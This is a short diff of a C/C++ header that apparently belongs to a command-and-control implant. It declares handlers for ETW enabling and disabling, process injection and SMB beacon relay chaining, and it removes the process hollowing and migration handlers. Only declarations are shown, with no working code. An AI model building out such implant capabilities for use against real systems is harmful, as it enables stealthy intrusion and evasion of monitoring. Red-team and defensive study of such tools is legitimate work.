@@ -36,10 +36,8 @@ bool handleRotateKey(const uint8_t* args, size_t args_len);
 bool handleEtwEnable(const uint8_t* args, size_t args_len);
 bool handleEtwDisable(const uint8_t* args, size_t args_len);
 
-// Process Injection / Hollowing / Migration
+// Process Injection
 bool handleInjectProcess(const uint8_t* args, size_t args_len);
-bool handleHollowProcess(const uint8_t* args, size_t args_len);
-bool handleMigrate(const uint8_t* args, size_t args_len);
 
 // P2P Relay (SMB Beacon Chaining)
 bool handleStartRelay(const uint8_t* args, size_t args_len);
